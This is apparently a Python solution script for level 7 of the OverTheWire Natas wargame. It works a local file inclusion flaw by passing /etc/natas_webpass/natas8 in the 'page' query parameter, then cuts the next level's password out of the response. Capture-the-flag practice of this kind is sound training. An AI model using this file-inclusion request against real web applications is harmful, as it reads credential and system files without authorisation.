import requests

import natas6
from helpers import between


def solution() -> str:
    url = "http://natas7.natas.labs.overthewire.org"
    username = "natas7"
    password = natas6.solution()

    # There is a "page" query parameter for the "Home" and "About"
    # links on the page. If you try changing the parameter to another
    # value (for example,
    # http://natas7.natas.labs.overthewire.org/index.php?page=asdf)
    # there is an error showing that the app is trying to include a file
    # name matching the parameter. The hint in the page source:
    # <!-- hint: password for webuser natas8 is in
    # /etc/natas_webpass/natas8 -->

    password_url = url + "/index.php?page=/etc/natas_webpass/natas8"
    r = requests.get(password_url, auth=(username, password))
    start = "<br>\n<br>\n"
    end = "\n\n<!-- hint:"
    natas8_password = between(r.text, start, end)
    return natas8_password
